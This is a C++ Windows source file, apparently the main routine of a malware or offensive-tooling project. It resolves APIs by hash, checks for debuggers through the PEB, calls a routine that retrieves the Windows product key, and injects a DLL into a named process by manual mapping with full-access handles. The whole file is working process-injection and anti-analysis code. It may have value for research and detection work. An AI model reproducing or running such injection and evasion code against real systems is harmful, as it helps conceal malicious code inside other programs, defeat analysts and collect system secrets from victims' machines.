#include "../headers/injection.h"
#include "utils/headers/Tools.h"
#include "utils/headers/AntiAnalysis.h"
#include "utils/headers/RunSysCommands.h"
#include "API/headers/api.h"
#include <string>
#include <sstream>


// Temporary, the dll location/name and the name of the process to inject into
const char *szDllFile = "C:\\Users\\scott\\Documents\\GitHub\\sample\\bin\\x64\\Release\\dll.dll";
const char *szProc    = "injector.exe";



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    API::APIResolver  resolver; // Load modules and functions by their hashes 
    AntiAnalysis      debug;    // Debug and sandbox checking
    Logging           tools;    // Used for error reporting
    PROCESSENTRY32    PE32{0};  // Used for getting information about processes
    PE32.dwSize =     sizeof(PE32);


    RunSysCommands cmd;
    cmd.GetProductKey(true);
    debug.PebCheck(resolver); // Check if being debugged

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Create snapshot of processes running

    if (hSnap == INVALID_HANDLE_VALUE)
    {
        tools.ShowError("CreateToolhelp32Snapshot failed: ", GetLastError());
        return 0;
    }
    

    BOOL bRet = Process32First(hSnap, &PE32);
    DWORD PID = 0;

    // Find the process that we want to manual map into
    while (bRet)
    {
        if (!strcmp(szProc, (LPCSTR)PE32.szExeFile))
        {
            PID = PE32.th32ProcessID;
            break;
        }
        bRet = Process32Next(hSnap, &PE32);
    }

    CloseHandle(hSnap);

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); // Get a handle to the process

    if (!hProc)
    {
        tools.ShowError("OpenProcess failed: ", GetLastError());
        return 0;
    }

    // Inject into the process
    if (!ManualMap(hProc, szDllFile))
    {
        tools.ShowError("Somethings fucked");
        CloseHandle(hProc);
        return 0;
    }

    CloseHandle(hProc);

    return 0;
}